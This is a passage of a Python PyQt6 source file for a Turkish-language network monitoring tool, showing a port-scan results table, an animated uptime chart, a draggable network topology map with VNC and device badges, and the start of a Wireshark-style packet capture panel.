        controls.addStretch();layout.addLayout(controls)
        self.progress=QProgressBar();self.progress.setVisible(False);layout.addWidget(self.progress)
        self.result_table=QTableWidget();self.result_table.setColumnCount(3);self.result_table.setHorizontalHeaderLabels(["Port","Servis","Banner"])
        self.result_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.result_table.setStyleSheet("QTableWidget{background:#16213e;border:1px solid #0f3460;border-radius:6px;}QTableWidget::item{padding:8px;}QHeaderView::section{background:#0f3460;color:#00ff88;padding:8px;border:none;}")
        layout.addWidget(self.result_table)
    def toggle_scan(self):
        if self.scan_thread and self.scan_thread.isRunning():
            self.scan_thread.stop();self.scan_thread.wait();self.scan_thread=None
            self.scan_btn.setText("🔍 Tara");self.progress.setVisible(False)
        else:
            ip=self.ip_input.text().strip()
            if not ip:QMessageBox.warning(self,"Uyarı","IP adresi girin!");return
            self.result_table.setRowCount(0);self.progress.setValue(0);self.progress.setVisible(True);self.scan_btn.setText("⏹ Durdur")
            self.scan_thread=PortScanThread(ip,self.port_start.value(),self.port_end.value())
            self.scan_thread.port_found.connect(self.on_port_found);self.scan_thread.progress.connect(self.on_progress);self.scan_thread.finished_scan.connect(self.on_finished)
            self.scan_thread.start()
    def on_port_found(self,port,service,banner):
        row=self.result_table.rowCount();self.result_table.insertRow(row)
        self.result_table.setItem(row,0,QTableWidgetItem(str(port)))
        self.result_table.setItem(row,1,QTableWidgetItem(service))
        self.result_table.setItem(row,2,QTableWidgetItem(banner))
    def on_progress(self,current,total):
        self.progress.setMaximum(total);self.progress.setValue(current)
    def on_finished(self):
        self.scan_btn.setText("🔍 Tara");self.progress.setVisible(False)
        QMessageBox.information(self,"Tamamlandı",f"{self.result_table.rowCount()} açık port bulundu!")

# Uptime Chart Widget - Cyberpunk Style
class UptimeChartWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent);self.setMinimumHeight(120);self.data=[];self.ip="";self.name="";self.glow_phase=0
        self.timer=QTimer(self);self.timer.timeout.connect(self.animate);self.timer.start(50)
    def animate(self):self.glow_phase=(self.glow_phase+0.1)%6.28;self.update()
    def set_data(self,ip,name,history):
        self.ip=ip;self.name=name;self.data=list(history)[-288:] if history else [];self.update()
    def paintEvent(self,e):
        p=QPainter(self);p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w,h=self.width(),self.height();margin=50;chart_w=w-margin*2;chart_h=h-50
        # Background gradient
        bg=QLinearGradient(0,0,0,h);bg.setColorAt(0,QColor(15,20,35));bg.setColorAt(1,QColor(10,15,25));p.fillRect(self.rect(),QBrush(bg))
        # Border with glow
        glow_alpha=int(100+50*math.sin(self.glow_phase));p.setPen(QPen(QColor(0,255,136,glow_alpha),2));p.setBrush(Qt.BrushStyle.NoBrush);p.drawRoundedRect(2,2,w-4,h-4,8,8)
        # Title
        p.setPen(QColor(0,255,136));p.setFont(QFont("Consolas",11,QFont.Weight.Bold));title=f"◈ {self.name}" if self.name else "◈ UPTIME";p.drawText(margin,22,title)
        p.setPen(QColor(0,212,255));p.setFont(QFont("Consolas",9));p.drawText(w-margin-80,22,self.ip)
        if not self.data:p.setPen(QColor(100,100,120));p.setFont(QFont("Segoe UI",10));p.drawText(w//2-40,h//2,"Veri bekleniyor...");return
        # Chart area
        p.setPen(QPen(QColor(0,100,120,60),1));p.drawRect(margin,35,chart_w,chart_h)
        # Grid lines
        for i in range(1,4):y=35+chart_h*i//4;p.setPen(QPen(QColor(0,100,120,30),1,Qt.PenStyle.DotLine));p.drawLine(margin,y,margin+chart_w,y)
        # Data bars with gradient
        if len(self.data)>0:
            bar_w=max(2,chart_w//max(len(self.data),1))
            for i,item in enumerate(self.data):
                x=margin+i*chart_w//len(self.data);is_up=item.get('up',False) if isinstance(item,dict) else (item[1] if len(item)>1 else True)
                if is_up:
                    grad=QLinearGradient(x,35,x,35+chart_h);grad.setColorAt(0,QColor(0,255,136,200));grad.setColorAt(1,QColor(0,200,100,150))
                else:
                    grad=QLinearGradient(x,35,x,35+chart_h);grad.setColorAt(0,QColor(231,76,60,200));grad.setColorAt(1,QColor(180,50,40,150))
                p.fillRect(x,35,max(1,bar_w-1),chart_h,QBrush(grad))
        # Stats
        online=sum(1 for d in self.data if (d.get('up',False) if isinstance(d,dict) else (d[1] if len(d)>1 else True)))
        total=len(self.data);pct=online*100//total if total>0 else 0
        p.setPen(QColor(0,255,136) if pct>90 else QColor(241,196,15) if pct>70 else QColor(231,76,60))
        p.setFont(QFont("Consolas",10,QFont.Weight.Bold));p.drawText(w-margin-60,h-8,f"Uptime: {pct}%")
        p.setPen(QColor(100,100,120));p.setFont(QFont("Consolas",8));p.drawText(margin,h-8,"◄ 24h önce");p.drawText(margin+chart_w-50,h-8,"Şimdi ►")

# Network Map Widget - Professional Cyberpunk Design
class NetworkMapWidget(QWidget):
    device_clicked=pyqtSignal(object)
    device_double_clicked=pyqtSignal(object)
    
    def __init__(self,parent=None):
        super().__init__(parent)
        self.devices=[];self.positions={};self.selected=None;self.gateway_ip=""
        self.hovered_device=None
        
        # Animation state
        self.anim_phase=0;self.pulse_phases={};self.data_packets=[]
        
        # Drag system
        self.drag_start_pos=None;self.drag_device_ip=None;self.is_dragging=False;self.drag_threshold=10
        
        # Zoom & Pan
        self.zoom=1.0;self.pan_offset=[0,0]
        
        self.setMinimumSize(800,600);self.setMouseTracking(True)
        self.timer=QTimer(self);self.timer.timeout.connect(self.animate);self.timer.start(33)
        self.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.customContextMenuRequested.connect(self.show_context_menu)
    
    def animate(self):
        self.anim_phase=(self.anim_phase+0.03)%6.28
        for ip in self.pulse_phases:self.pulse_phases[ip]=(self.pulse_phases[ip]+0.06)%6.28
        
        # Data packet animation
        if self.devices and random.random()<0.15:  # Yeni paket spawn
            if len(self.devices)>1:
                target=random.choice([d for d in self.devices if d.ip!=self.gateway_ip])
                if target.ip in self.positions:
                    self.data_packets.append({'progress':0,'target_ip':target.ip,'speed':random.uniform(0.02,0.04),'color':random.choice(['#00ff88','#00d4ff','#ff6b6b','#ffd93d'])})
        
        # Update packets
        self.data_packets=[p for p in self.data_packets if p['progress']<1]
        for p in self.data_packets:p['progress']+=p['speed']
        
        self.update()
    
    def set_devices(self,devices,gateway_ip=""):
        self.devices=[d for d in devices if d.status=="online"]
        self.gateway_ip=gateway_ip or get_subnet()+".1"
        for d in self.devices:
            if d.ip not in self.pulse_phases:self.pulse_phases[d.ip]=random.uniform(0,6.28)
        self.auto_layout()
    
    def auto_layout(self):
        if not self.devices:return
        w,h=self.width(),self.height()
        cx,cy=w//2,h//2  # Tam merkez
        from PyQt6.QtCore import QPointF
        
        # Gateway merkeze - biraz yukarıda
        self.positions[self.gateway_ip]=QPointF(cx,cy-30)
        
        # Diğer cihazları katmanlara yerleştir
        others=[d for d in self.devices if d.ip!=self.gateway_ip]
        n=len(others)
        if n==0:return
        
        # Daha geniş ve yüksek yerleşim - ekrana göre ölçekle
        scale_x=min(1.0,w/1200)
        scale_y=min(1.0,h/800)
        scale=min(scale_x,scale_y)
        
        # Katmanlar: (radius, max_device_per_layer)
        layers=[
            (int(120*scale),6),
            (int(200*scale),10),
            (int(280*scale),14),
            (int(360*scale),18),
            (int(440*scale),22),
            (int(520*scale),26)
        ]
        
        idx=0
        for radius,max_per in layers:
            if idx>=n:break
            count=min(max_per,n-idx)
            for i in range(count):
                if idx>=n:break
                d=others[idx]
                angle=(360/count)*i-90
                rad=math.radians(angle)
                # Daha oval yerleşim (yatay daha geniş)
                x=cx+radius*math.cos(rad)*1.2
                y=cy+radius*math.sin(rad)*0.8
                self.positions[d.ip]=QPointF(x,y)
                idx+=1
        self.update()
    
    def resizeEvent(self,event):
        """Pencere boyutu değişince yeniden düzenle"""
        super().resizeEvent(event)
        if self.devices and len(self.positions)>0:
            # Mevcut pozisyonları ölçekle
            old_w=event.oldSize().width() if event.oldSize().width()>0 else self.width()
            old_h=event.oldSize().height() if event.oldSize().height()>0 else self.height()
            new_w,new_h=self.width(),self.height()
            
            if old_w>0 and old_h>0:
                scale_x=new_w/old_w
                scale_y=new_h/old_h
                
                from PyQt6.QtCore import QPointF
                for ip in self.positions:
                    pos=self.positions[ip]
                    self.positions[ip]=QPointF(pos.x()*scale_x,pos.y()*scale_y)
    
    def get_device_at(self,pos):
        for d in self.devices:
            dpos=self.positions.get(d.ip)
            if dpos:
                size=70 if d.ip==self.gateway_ip else 54
                if abs(pos.x()-dpos.x())<size//2+5 and abs(pos.y()-dpos.y())<size//2+5:
                    return d
        return None
    
    def show_context_menu(self,pos):
        device=self.get_device_at(pos) or self.selected
        if not device:return
        
        menu=QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #1e2a4a,stop:1 #0f1729);color:white;border:2px solid #00ff88;border-radius:10px;padding:8px;}
            QMenu::item{padding:10px 25px;border-radius:6px;font-size:12px;}
            QMenu::item:selected{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00ff88,stop:1 #00d4ff);color:#0a0a14;}
            QMenu::separator{height:2px;background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 transparent,stop:0.5 #00ff88,stop:1 transparent);margin:5px 15px;}
        """)
        
        title=menu.addAction(f"◈ {device.ip}" + (f" • {device.asset_name}" if device.asset_name else ""))
        title.setEnabled(False)
        menu.addSeparator()
        
        menu.addAction("🔍 Detaylar").triggered.connect(lambda:self.device_double_clicked.emit(device))
        if device.vnc_available:menu.addAction("🖥️ VNC Bağlan").triggered.connect(lambda:self.device_clicked.emit(device))
        menu.addSeparator()
        menu.addAction("📋 IP Kopyala").triggered.connect(lambda:QApplication.clipboard().setText(device.ip))
        if device.mac:menu.addAction("📋 MAC Kopyala").triggered.connect(lambda:QApplication.clipboard().setText(device.mac))
        menu.addSeparator()
        menu.addAction("🎯 Merkeze Al").triggered.connect(lambda:self.center_device(device))
        
        menu.exec(self.mapToGlobal(pos))
    
    def center_device(self,device):
        from PyQt6.QtCore import QPointF
        if device and device.ip in self.positions:
            self.positions[device.ip]=QPointF(self.width()//2,self.height()//2)
            self.update()
    
    def draw_hex_grid(self,p,w,h):
        """Hexagonal arka plan deseni"""
        hex_size=30
        p.setPen(QPen(QColor(0,80,100,25),1))
        for row in range(-1,h//hex_size+2):
            for col in range(-1,w//(hex_size*2)+2):
                x=col*hex_size*1.75+(hex_size if row%2 else 0)
                y=row*hex_size*1.5
                # Hexagon çiz
                points=[]
                for i in range(6):
                    angle=math.radians(60*i-30)
                    px=x+hex_size*0.6*math.cos(angle)
                    py=y+hex_size*0.6*math.sin(angle)
                    points.append((int(px),int(py)))
                for i in range(6):
                    p.drawLine(points[i][0],points[i][1],points[(i+1)%6][0],points[(i+1)%6][1])
    
    def draw_bezier_connection(self,p,start,end,color,width=2,animated=False):
        """Bezier eğrili bağlantı çizgisi"""
        from PyQt6.QtCore import QPointF
        path=QPainterPath()
        path.moveTo(start)
        
        # Control points
        mid_y=(start.y()+end.y())/2
        ctrl1=QPointF(start.x(),mid_y)
        ctrl2=QPointF(end.x(),mid_y)
        
        path.cubicTo(ctrl1,ctrl2,end)
        
        # Gradient çizgi
        grad=QLinearGradient(start,end)
        alpha=int(150+50*math.sin(self.anim_phase)) if animated else 180
        grad.setColorAt(0,QColor(color.red(),color.green(),color.blue(),alpha))
        grad.setColorAt(1,QColor(color.red()//2,color.green()//2,color.blue(),alpha//2))
        
        p.setPen(QPen(QBrush(grad),width))
        p.drawPath(path)
        
        return path
    
    def draw_device_card(self,p,device,pos,is_selected,is_hovered):
        """Profesyonel cihaz kartı"""
        is_gw=device.ip==self.gateway_ip
        size=70 if is_gw else 54
        x,y=int(pos.x())-size//2,int(pos.y())-size//2
        pulse=self.pulse_phases.get(device.ip,0)
        
        # Glow efekti
        if device.status=="online":
            glow_size=size+15+8*math.sin(pulse)
            glow=QRadialGradient(pos.x(),pos.y(),glow_size)
            if device.is_critical:
                glow.setColorAt(0,QColor(255,80,80,100));glow.setColorAt(0.5,QColor(255,50,50,50));glow.setColorAt(1,QColor(255,0,0,0))
            elif is_gw:
                glow.setColorAt(0,QColor(0,212,255,120));glow.setColorAt(0.5,QColor(0,150,200,50));glow.setColorAt(1,QColor(0,100,150,0))
            else:
                glow.setColorAt(0,QColor(0,255,136,80));glow.setColorAt(0.5,QColor(0,200,100,30));glow.setColorAt(1,QColor(0,150,80,0))
            p.setBrush(QBrush(glow));p.setPen(Qt.PenStyle.NoPen)
            p.drawEllipse(int(pos.x()-glow_size),int(pos.y()-glow_size),int(glow_size*2),int(glow_size*2))
        
        # Selection ring
        if is_selected:
            ring_size=size+20+3*math.sin(self.anim_phase*2)
            p.setPen(QPen(QColor(76,201,240),3))
            p.setBrush(Qt.BrushStyle.NoBrush)
            p.drawEllipse(int(pos.x()-ring_size//2),int(pos.y()-ring_size//2),int(ring_size),int(ring_size))
        
        # Hover efekti
        if is_hovered and not is_selected:
            p.setPen(QPen(QColor(255,255,255,150),2))
            p.setBrush(Qt.BrushStyle.NoBrush)
            p.drawEllipse(x-3,y-3,size+6,size+6)
        
        # Kart gölgesi
        shadow=QRadialGradient(pos.x()+3,pos.y()+5,size)
        shadow.setColorAt(0,QColor(0,0,0,80));shadow.setColorAt(1,QColor(0,0,0,0))
        p.setBrush(QBrush(shadow));p.setPen(Qt.PenStyle.NoPen)
        p.drawEllipse(x-5,y-3,size+10,size+10)
        
        # Ana kart - gradient
        card_grad=QRadialGradient(pos.x(),pos.y()-size//4,size)
        if is_gw:
            card_grad.setColorAt(0,QColor(30,60,90));card_grad.setColorAt(1,QColor(15,35,55))
        elif device.is_critical:
            card_grad.setColorAt(0,QColor(80,30,30));card_grad.setColorAt(1,QColor(50,20,20))
        else:
            card_grad.setColorAt(0,QColor(35,50,75));card_grad.setColorAt(1,QColor(20,30,50))
        
        # Border rengi
        if is_selected:border_col=QColor(76,201,240)
        elif device.is_critical:border_col=QColor(255,100,100)
        elif is_gw:border_col=QColor(0,212,255)
        elif device.vnc_available:border_col=QColor(39,174,96)
        else:border_col=QColor(0,255,136)
        
        p.setBrush(QBrush(card_grad))
        p.setPen(QPen(border_col,2))
        p.drawRoundedRect(x,y,size,size,size//2,size//2)  # Yuvarlak kart
        
        # İkon
        if device.asset_type:
            try:icon=ASSET_CONFIG[AssetType(device.asset_type)]['icon']
            except:icon="💻"
        else:
            icon="🌐" if is_gw else ("🖥️" if device.vnc_available else "💻")
        
        p.setPen(QColor(255,255,255))
        p.setFont(QFont("Segoe UI Emoji",22 if is_gw else 16))
        p.drawText(x,y,size,size,Qt.AlignmentFlag.AlignCenter,icon)
        
        # IP badge
        ip_short="."+device.ip.split(".")[-1]
        badge_w=35;badge_h=16
        badge_x=int(pos.x())-badge_w//2
        badge_y=y+size+4
        
        badge_grad=QLinearGradient(badge_x,badge_y,badge_x+badge_w,badge_y)
        badge_grad.setColorAt(0,QColor(border_col.red(),border_col.green(),border_col.blue(),200))
        badge_grad.setColorAt(1,QColor(border_col.red()//2,border_col.green()//2,border_col.blue()//2,200))
        
        p.setBrush(QBrush(badge_grad))
        p.setPen(Qt.PenStyle.NoPen)
        p.drawRoundedRect(badge_x,badge_y,badge_w,badge_h,badge_h//2,badge_h//2)
        
        p.setPen(QColor(255,255,255))
        p.setFont(QFont("Consolas",9,QFont.Weight.Bold))
        p.drawText(badge_x,badge_y,badge_w,badge_h,Qt.AlignmentFlag.AlignCenter,ip_short)
        
        # İsim etiketi
        name=device.asset_name or device.hostname or ""
        if name:
            name=name[:12]+"…" if len(name)>12 else name
            p.setPen(QColor(200,200,220))
            p.setFont(QFont("Segoe UI",8))
            p.drawText(x-10,badge_y+badge_h+2,size+20,14,Qt.AlignmentFlag.AlignCenter,name)
        
        # Vendor ve Device Type bilgisi (ismin altına)
        info_y = badge_y + badge_h + (16 if name else 2)
        
        # Device type ikonu ve yazısı
        if device.device_type and device.device_type != "unknown":
            dtype_icons = {
                'router': '🌐', 'switch': '🔀', 'camera': '📹', 'printer': '🖨️',
                'computer': '💻', 'nas': '💾', 'firewall': '🔥', 'server': '🖥️',
                'access_point': '📡', 'phone': '📞'
            }
            dtype_icon = dtype_icons.get(device.device_type, '📦')
            dtype_text = device.device_type.capitalize()[:8]
            p.setPen(QColor(0,212,255))
            p.setFont(QFont("Segoe UI",7))
            p.drawText(x-15,info_y,size+30,12,Qt.AlignmentFlag.AlignCenter,f"{dtype_icon} {dtype_text}")
            info_y += 11
        
        # Vendor bilgisi
        if device.vendor:
            vendor_short = device.vendor[:15] + "…" if len(device.vendor) > 15 else device.vendor
            p.setPen(QColor(150,150,180))
            p.setFont(QFont("Segoe UI",6))
            p.drawText(x-20,info_y,size+40,10,Qt.AlignmentFlag.AlignCenter,f"🏭 {vendor_short}")
        
        # Açık portlar (küçük)
        if device.open_ports:
            info_y += 10
            ports_str = ",".join(str(p) for p in device.open_ports[:4])
            if len(device.open_ports) > 4:
                ports_str += "…"
            p.setPen(QColor(93,173,226))
            p.setFont(QFont("Consolas",6))
            p.drawText(x-20,info_y,size+40,10,Qt.AlignmentFlag.AlignCenter,f"🔓 {ports_str}")
        
        # VNC badge
        if device.vnc_available:
            p.setBrush(QColor(39,174,96))
            p.setPen(Qt.PenStyle.NoPen)
            p.drawRoundedRect(x+size-18,y+2,18,12,6,6)
            p.setPen(QColor(255,255,255))
            p.setFont(QFont("Segoe UI",6,QFont.Weight.Bold))
            p.drawText(x+size-18,y+2,18,12,Qt.AlignmentFlag.AlignCenter,"VNC")
        
        # Kritik badge
        if device.is_critical:
            p.setPen(QColor(255,100,100))
            p.setFont(QFont("Segoe UI",12))
            p.drawText(x+2,y+12,"⚠")
    
    def draw_legend(self,p,w,h):
        """Legend paneli"""
        legend_x,legend_y=w-130,10
        legend_w,legend_h=120,95
        
        # Arka plan
        p.setBrush(QColor(10,15,25,220))
        p.setPen(QPen(QColor(0,150,180,100),1))
        p.drawRoundedRect(legend_x,legend_y,legend_w,legend_h,8,8)
        
        p.setPen(QColor(0,212,255))
        p.setFont(QFont("Consolas",9,QFont.Weight.Bold))
        p.drawText(legend_x+8,legend_y+15,"◈ LEGEND")
        
        items=[
            (QColor(0,212,255),"Gateway"),
            (QColor(0,255,136),"Online"),
            (QColor(39,174,96),"VNC"),
            (QColor(255,100,100),"Kritik"),
        ]
        
        for i,(color,text) in enumerate(items):
            y=legend_y+30+i*15
            p.setBrush(color)
            p.setPen(Qt.PenStyle.NoPen)
            p.drawEllipse(legend_x+10,y,8,8)
            p.setPen(QColor(180,180,200))
            p.setFont(QFont("Segoe UI",8))
            p.drawText(legend_x+25,y+8,text)
    
    def draw_info_panel(self,p,w,h):
        """Seçili cihaz info paneli"""
        if not self.selected:return
        
        panel_x,panel_y=10,h-110
        panel_w,panel_h=180,100
        
        # Arka plan
        bg=QLinearGradient(panel_x,panel_y,panel_x,panel_y+panel_h)
        bg.setColorAt(0,QColor(15,25,45,240))
        bg.setColorAt(1,QColor(10,18,35,240))
        p.setBrush(QBrush(bg))
        p.setPen(QPen(QColor(0,255,136,150),1))
        p.drawRoundedRect(panel_x,panel_y,panel_w,panel_h,10,10)
        
        d=self.selected
        p.setPen(QColor(0,255,136))
        p.setFont(QFont("Consolas",10,QFont.Weight.Bold))
        p.drawText(panel_x+10,panel_y+18,"◈ SEÇİLİ CİHAZ")
        
        p.setPen(QColor(255,255,255))
        p.setFont(QFont("Segoe UI",9))
        p.drawText(panel_x+10,panel_y+36,f"IP: {d.ip}")
        
        name=d.asset_name or d.hostname or "-"
        p.drawText(panel_x+10,panel_y+52,f"Ad: {name[:18]}")
        
        p.setPen(QColor(150,150,180))
        p.setFont(QFont("Segoe UI",8))
        if d.mac:p.drawText(panel_x+10,panel_y+68,f"MAC: {d.mac[:17]}")
        if d.vendor:p.drawText(panel_x+10,panel_y+82,f"🏭 {d.vendor[:20]}")
        
        # Status indicator
        status_col=QColor(0,255,136) if d.status=="online" else QColor(231,76,60)
        p.setBrush(status_col)
        p.setPen(Qt.PenStyle.NoPen)
        p.drawEllipse(panel_x+panel_w-20,panel_y+10,10,10)
    
    def draw_stats_bar(self,p,w,h):
        """Alt istatistik çubuğu"""
        bar_h=28
        bar_y=h-bar_h
        
        # Gradient arka plan
        bg=QLinearGradient(0,bar_y,0,h)
        bg.setColorAt(0,QColor(10,15,25,200))
        bg.setColorAt(1,QColor(5,10,20,230))
        p.fillRect(0,bar_y,w,bar_h,QBrush(bg))
        
        # Üst çizgi
        line_grad=QLinearGradient(0,bar_y,w,bar_y)
        line_grad.setColorAt(0,QColor(0,255,136,0))
        line_grad.setColorAt(0.2,QColor(0,255,136,150))
        line_grad.setColorAt(0.8,QColor(0,212,255,150))
        line_grad.setColorAt(1,QColor(0,212,255,0))
        p.setPen(QPen(QBrush(line_grad),2))
        p.drawLine(0,bar_y,w,bar_y)
        
        # İstatistikler
        online=len([d for d in self.devices if d.status=="online"])
        vnc=len([d for d in self.devices if d.vnc_available])
        critical=len([d for d in self.devices if d.is_critical])
        
        p.setFont(QFont("Consolas",10))
        
        stats=[
            (f"🌐 {online} Online",QColor(0,255,136)),
            (f"🖥️ {vnc} VNC",QColor(39,174,96)),
            (f"⚠️ {critical} Kritik",QColor(255,100,100)),
        ]
        
        x=15
        for text,color in stats:
            p.setPen(color)
            p.drawText(x,bar_y+18,text)
            x+=100
        
        # Sağ taraf - yardım
        p.setPen(QColor(100,100,130))
        p.setFont(QFont("Segoe UI",8))
        help_text="Sol tık: Seç | Sürükle: Taşı | Sağ tık: Menü | Çift tık: Detay"
        p.drawText(w-320,bar_y+17,help_text)
    
    def paintEvent(self,e):
        p=QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w,h=self.width(),self.height()
        
        # Arka plan gradient
        bg=QRadialGradient(w//2,h//2,max(w,h)*0.7)
        bg.setColorAt(0,QColor(18,25,45))
        bg.setColorAt(0.5,QColor(12,18,35))
        bg.setColorAt(1,QColor(6,10,22))
        p.fillRect(self.rect(),QBrush(bg))
        
        # Hexagonal grid
        self.draw_hex_grid(p,w,h)
        
        # Başlık
        title_grad=QLinearGradient(0,0,250,0)
        title_grad.setColorAt(0,QColor(0,255,136))
        title_grad.setColorAt(1,QColor(0,212,255))
        p.setPen(QPen(QBrush(title_grad),1))
        p.setFont(QFont("Consolas",14,QFont.Weight.Bold))
        p.drawText(15,28,"◈ NETWORK TOPOLOGY")
        
        if not self.devices:
            p.setPen(QColor(80,100,130))
            p.setFont(QFont("Consolas",16))
            p.drawText(w//2-100,h//2,"◈ Ağ taraması yapın...")
            p.setFont(QFont("Segoe UI",11))
            p.setPen(QColor(60,80,100))
            p.drawText(w//2-120,h//2+35,"Radar sekmesinden tarama başlatın")
            return
        
        from PyQt6.QtCore import QPointF
        gw_pos=self.positions.get(self.gateway_ip,QPointF(w//2,100))
        
        # Bağlantı çizgileri (Bezier)
        for d in self.devices:
            if d.ip==self.gateway_ip:continue
            pos=self.positions.get(d.ip)
            if not pos:continue
            
            color=QColor(0,255,136) if d.status=="online" else QColor(100,100,100)
            if d.is_critical:color=QColor(255,100,100)
            self.draw_bezier_connection(p,gw_pos,pos,color,2,True)
        
        # Data paketleri animasyonu
        for packet in self.data_packets:
            target_pos=self.positions.get(packet['target_ip'])
            if not target_pos:continue
            
            t=packet['progress']
            # Bezier üzerinde pozisyon (basitleştirilmiş)
            px=gw_pos.x()+(target_pos.x()-gw_pos.x())*t
            mid_y=(gw_pos.y()+target_pos.y())/2
            py=gw_pos.y()+(mid_y-gw_pos.y())*t*2 if t<0.5 else mid_y+(target_pos.y()-mid_y)*(t-0.5)*2
            
            # Paket çiz
            packet_color=QColor(packet['color'])
            glow=QRadialGradient(px,py,12)
            glow.setColorAt(0,QColor(packet_color.red(),packet_color.green(),packet_color.blue(),200))
            glow.setColorAt(1,QColor(packet_color.red(),packet_color.green(),packet_color.blue(),0))
            p.setBrush(QBrush(glow))
            p.setPen(Qt.PenStyle.NoPen)
            p.drawEllipse(int(px-12),int(py-12),24,24)
            
            p.setBrush(packet_color)
            p.drawEllipse(int(px-4),int(py-4),8,8)
        
        # Cihazları çiz
        for d in self.devices:
            pos=self.positions.get(d.ip)
            if not pos:continue
            is_sel=self.selected and self.selected.ip==d.ip
            is_hov=self.hovered_device and self.hovered_device.ip==d.ip
            self.draw_device_card(p,d,pos,is_sel,is_hov)
        
        # UI elementleri
        self.draw_legend(p,w,h)
        self.draw_info_panel(p,w,h)
        self.draw_stats_bar(p,w,h)
        
        # Dış çerçeve
        frame_grad=QLinearGradient(0,0,w,h)
        frame_grad.setColorAt(0,QColor(0,255,136,180))
        frame_grad.setColorAt(0.3,QColor(0,212,255,100))
        frame_grad.setColorAt(0.7,QColor(0,255,136,100))
        frame_grad.setColorAt(1,QColor(0,212,255,180))
        p.setPen(QPen(QBrush(frame_grad),2))
        p.setBrush(Qt.BrushStyle.NoBrush)
        p.drawRoundedRect(1,1,w-2,h-2,12,12)
    
    def mousePressEvent(self,e):
        if e.button()==Qt.MouseButton.LeftButton:
            pos=e.position()
            device=self.get_device_at(pos)
            if device:
                self.drag_start_pos=pos
                self.drag_device_ip=device.ip
                self.is_dragging=False
                self.selected=device
                self.update()
            else:
                self.selected=None
                self.drag_start_pos=None
                self.drag_device_ip=None
                self.update()
    
    def mouseMoveEvent(self,e):
        pos=e.position()
        
        hovered=self.get_device_at(pos)
        if hovered!=self.hovered_device:
            self.hovered_device=hovered
            self.setCursor(Qt.CursorShape.PointingHandCursor if hovered else Qt.CursorShape.ArrowCursor)
            self.update()
        
        if self.drag_start_pos and self.drag_device_ip:
            dx=pos.x()-self.drag_start_pos.x()
            dy=pos.y()-self.drag_start_pos.y()
            if math.sqrt(dx*dx+dy*dy)>=self.drag_threshold:
                self.is_dragging=True
                self.setCursor(Qt.CursorShape.ClosedHandCursor)
            
            if self.is_dragging:
                from PyQt6.QtCore import QPointF
                self.positions[self.drag_device_ip]=QPointF(
                    max(50,min(pos.x(),self.width()-50)),
                    max(50,min(pos.y(),self.height()-80))
                )
                self.update()
    
    def mouseReleaseEvent(self,e):
        if e.button()==Qt.MouseButton.LeftButton:
            if not self.is_dragging and self.selected:
                self.device_clicked.emit(self.selected)
            
            self.drag_start_pos=None
            self.drag_device_ip=None
            self.is_dragging=False
            self.setCursor(Qt.CursorShape.PointingHandCursor if self.hovered_device else Qt.CursorShape.ArrowCursor)
            self.update()
    
    def mouseDoubleClickEvent(self,e):
        device=self.get_device_at(e.position())
        if device:
            self.device_double_clicked.emit(device)
    
    def leaveEvent(self,e):
        self.hovered_device=None
        self.update()

# ============= WIRESHARK-STYLE MONITORING WIDGET =============

class WiresharkWidget(QWidget):
    """Wireshark tarzı profesyonel ağ izleme widget'ı"""
    def __init__(self,parent=None):
        super().__init__(parent)
        self.capture_thread=None
        self.packets=[]
        self.filtered_packets=[]
        self.current_filter=""
        self.is_capturing=False
        self.selected_packet=None
        self.setup_ui()
    
    def setup_ui(self):
        layout=QVBoxLayout(self)
        layout.setContentsMargins(0,0,0,0)
        layout.setSpacing(0)
        
        # ===== ÜST BAR - Kontroller =====
        top_bar=QFrame()
        top_bar.setStyleSheet("QFrame{background:#1a1a2e;border-bottom:2px solid #00ff88;}")
        top_layout=QHBoxLayout(top_bar)
        top_layout.setContentsMargins(10,8,10,8)
        
        # Başlat/Durdur butonu
        self.capture_btn=QPushButton("▶ Yakala")
        self.capture_btn.setMinimumWidth(120)
        self.capture_btn.setStyleSheet("""
            QPushButton{background:#00ff88;color:#0a0a14;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#00cc6a;}
            QPushButton:checked{background:#e74c3c;}
        """)
        self.capture_btn.setCheckable(True)
        self.capture_btn.clicked.connect(self.toggle_capture)
        top_layout.addWidget(self.capture_btn)
        
        # Temizle butonu
        clear_btn=QPushButton("🗑 Temizle")
        clear_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:10px 15px;border:1px solid #0f3460;border-radius:6px;}QPushButton:hover{background:#16213e;border-color:#00ff88;}")
        clear_btn.clicked.connect(self.clear_packets)
        top_layout.addWidget(clear_btn)
        
        top_layout.addSpacing(20)
        
        # Filtre çubuğu
        filter_icon=QLabel("🔍")
        filter_icon.setStyleSheet("font-size:16px;")
        top_layout.addWidget(filter_icon)
        
        self.filter_input=QLineEdit()
        self.filter_input.setPlaceholderText("Filtre... (örn: tcp, ip==192.168.1.1, port==80, http)")
        self.filter_input.setStyleSheet("""
            QLineEdit{background:#0a0a14;color:#00ff88;border:2px solid #0f3460;border-radius:6px;padding:8px 15px;font-family:Consolas;font-size:12px;}
            QLineEdit:focus{border-color:#00ff88;}
        """)
        self.filter_input.textChanged.connect(self.apply_filter)
        self.filter_input.returnPressed.connect(self.apply_filter)
        top_layout.addWidget(self.filter_input,1)
        
        # Filtre butonları
        for f_name,f_val in [("TCP","tcp"),("UDP","udp"),("ARP","arp"),("HTTP","http"),("DNS","dns")]:
            btn=QPushButton(f_name)
            btn.setStyleSheet(f"QPushButton{{background:{PROTOCOL_COLORS.get(f_name.upper(),'#555')};color:white;padding:6px 12px;border:none;border-radius:4px;font-size:10px;font-weight:bold;}}QPushButton:hover{{opacity:0.8;}}")
            btn.clicked.connect(lambda _,v=f_val:self.set_quick_filter(v))
            top_layout.addWidget(btn)
        
        layout.addWidget(top_bar)
        
        # ===== ANA İÇERİK =====
        main_splitter=QSplitter(Qt.Orientation.Vertical)
        main_splitter.setStyleSheet("QSplitter::handle{background:#0f3460;height:3px;}")
        
        # Paket listesi tablosu
        self.packet_table=QTableWidget()
        self.packet_table.setColumnCount(7)
